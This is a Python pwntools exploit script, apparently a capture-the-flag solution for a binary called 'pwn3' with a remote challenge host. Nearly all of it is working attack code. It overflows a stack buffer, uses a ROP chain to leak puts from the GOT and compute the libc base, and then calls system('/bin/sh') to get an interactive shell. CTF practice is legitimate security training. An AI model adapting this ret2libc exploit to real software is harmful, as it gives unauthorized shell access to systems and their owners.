#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./pwn3"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("challs.n00bzunit3d.xyz", 42450)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
        b *main+78
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


rop_pop_rdi = 0x00401232
rop_ret = 0x00401244

"""
# leak remote libc address
payload = b"A" * 0x8 * 5
payload += p64(rop_pop_rdi)
payload += p64(elf.got["puts"])
payload += p64(elf.plt["puts"])

p.recvuntil("?")
p.sendline(payload)
p.recvuntil(b'}\n')# end of fake flag

leak = u64(p.recv(6) + b'\0' * 2)
log.info("leak: " + hex(leak))

# system@libc = 0x7f8118c9bd60
# puts@libc = 0x7efda636fed0
"""

# leak libc base
payload = b"A" * 0x8 * 5
payload += p64(rop_pop_rdi)
payload += p64(elf.got["puts"])
payload += p64(elf.plt["puts"])
payload += p64(elf.symbols["main"])

p.recvuntil("?")
p.sendline(payload)
p.recvuntil(b'}\n')# end of fake flag

puts_libc_addr = u64(p.recv(6) + b'\0' * 2)
log.info("puts@libc: " + hex(puts_libc_addr))
libc_base = puts_libc_addr - libc.symbols["puts"]
libc.address = libc_base
log.info("libc_base: " + hex(libc_base))
system_libc_addr = libc.symbols["system"]

# exec system("/bin/sh")
binsh_addr = next(libc.search(b'/bin/sh\x00'))

payload = b"A" * 0x8 * 5
payload += p64(rop_pop_rdi)
payload += p64(binsh_addr)
payload += p64(rop_ret)# for movaps (stack alignment error)
payload += p64(system_libc_addr)

p.recvuntil("?")
p.sendline(payload)

p.interactive()
